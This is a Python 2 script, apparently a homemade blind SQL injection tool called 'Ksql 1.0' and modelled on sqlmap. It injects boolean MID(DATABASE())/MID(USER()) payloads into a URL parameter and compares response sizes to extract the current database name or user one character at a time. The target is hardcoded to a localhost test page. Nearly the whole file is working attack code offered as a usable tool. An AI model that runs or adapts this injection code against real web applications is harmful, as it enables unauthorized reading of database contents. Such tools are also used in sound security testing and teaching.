#!/usr/bin/env python
# -*- coding:utf-8 -*-

"""
	author:		kaysen - http://www.xujiantao.com
	version:	Ksql 1.0
"""

import sys, os, io, inspect, string, time, urllib, re, urlparse, difflib, chardet, filecmp, json, getopt
from difflib import *
import threading
from time import ctime,sleep 


reload(sys)
sys.setdefaultencoding('utf8')

def main(argv):
     for arg in argv:
        print arg
		
		
def modulePath():
    """
    This will get us the program's directory, even if we are frozen
    using py2exe
    """

    try:
        _ = sys.executable if weAreFrozen() else __file__
    except NameError:
        _ = inspect.getsourcefile(modulePath)

    return os.path.dirname(os.path.realpath(_))

	
def htmlDecode(string):

	tmpHtmlaEncode = None
	try:
		pageInfo = chardet.detect(string)

		tmpHtmlEncode = string.decode(pageInfo['encoding'])
		
		#获取系统编码
		currentSystemEncoding = sys.getfilesystemencoding()
		
		tmpHtmlEncode = tmpHtmlEncode.encode(currentSystemEncoding)
		
	except Exception as e:
		print "错误：在处理网页编码时遇到问题：" + str(e)
		return
		
	return tmpHtmlEncode
	

def run(type, tmpUrl, num, succPageSize, frontThread):
	
	if frontThread != None: 
		frontThread.join()

	ITOA64 = "abcdefghijklmnopqrstuvwxyz@0123456789"
	for word in ITOA64:

		newUrl = tmpUrl
		
		if type == '--current-db':
			newUrl = newUrl.replace('[[[ID]]]', '1" AND MID(DATABASE(),' + str(num) + ',1)="' + word)
		
		elif type == '--current-user':
			newUrl = newUrl.replace('[[[ID]]]', '1" AND MID(USER(),' + str(num) + ',1)="' + word)
			
		currPageSize = len(htmlDecode(urllib.urlopen(newUrl).read()))
		
		print newUrl
		
		if succPageSize == currPageSize:
			file_object = open('infomation.log', 'a')
			file_object.write(word)
			file_object.close()
			print '================: ' + word
			break
			
		print "Time: %s \r\n" %(ctime())
		time.sleep(0.1)

	
SQLMAP_ROOT_PATH = modulePath()
KSQL_XML_PATH = os.path.join(SQLMAP_ROOT_PATH, "xml")
QUERIES_XML = os.path.join(KSQL_XML_PATH, "queries.xml")


url = 'http://localhost/test/test.php?id=1&name=kaysen'


if os.path.exists('infomation.log'):
	os.remove('infomation.log')

	
def manage(type):	
	values = url.split('?')[-1]
	host = url.split('?')[0]
	tmpUrl = ''
	
	'''
	暂时先只处理一个参数
	'''
	for key_value in values.split('&'):
		val = key_value.split('=')
		tmpUrl = host + '?' + val[0] + '=[[[' + val[0].upper() + ']]]'
		
		break


	''' Blind SQL Injection '''
	succPageSize = len(htmlDecode(urllib.urlopen(url).read()))
	threads = []
	''' 枚举位数 '''
	for num in range(1, 15):
		#run(tmpUrl, num, succPageSize)
		
		if len(threads) == 0:
			threads.append(threading.Thread(target=run,args=(type, tmpUrl, num, succPageSize, None)))
		else:
			threads.append(threading.Thread(target=run,args=(type, tmpUrl, num, succPageSize, threads[-1])))
	
	for item in threads:
		item.setDaemon(True)
		item.start()
		
	item.join()
	
	

	file_object = open('infomation.log', 'r')
	try:
		 all_the_text = file_object.read()
	finally:
		 file_object.close()

		 
	print "Result: " + all_the_text
	

def Usage():
	print 'Ksql.py usage:'
	print '--current-user, Retrieve DBMS current user'
	print '--current-db, Retrieve DBMS current database'
	print '-h, --help: print help message.'
	print '-v, --version: print script version'
def Version():
    print 'Ksql v1.0'
def OutPut(args):
    print 'Hello, %s'%args
def main(argv):
	if len(argv) == 1:
		Usage()
		sys.exit(2)

	try:
		opts, args = getopt.getopt(argv[1:], 'hv:', ['current-db', 'current-user'])
	except getopt.GetoptError, err:
		print str(err)
		Usage()
		sys.exit(2)

		
	for o, a in opts:
		if o in ('--current-db', '--current-user'):
			manage(o)
			sys.exit(0)
		elif o in ('-h', '--help'):
			Usage()
			sys.exit(1)
		elif o in ('-v', '--version'):
			Version()
			sys.exit(0)
		else:
			print 'unhandled option'
			sys.exit(3)

if __name__ == '__main__':
	main(sys.argv)
		

	
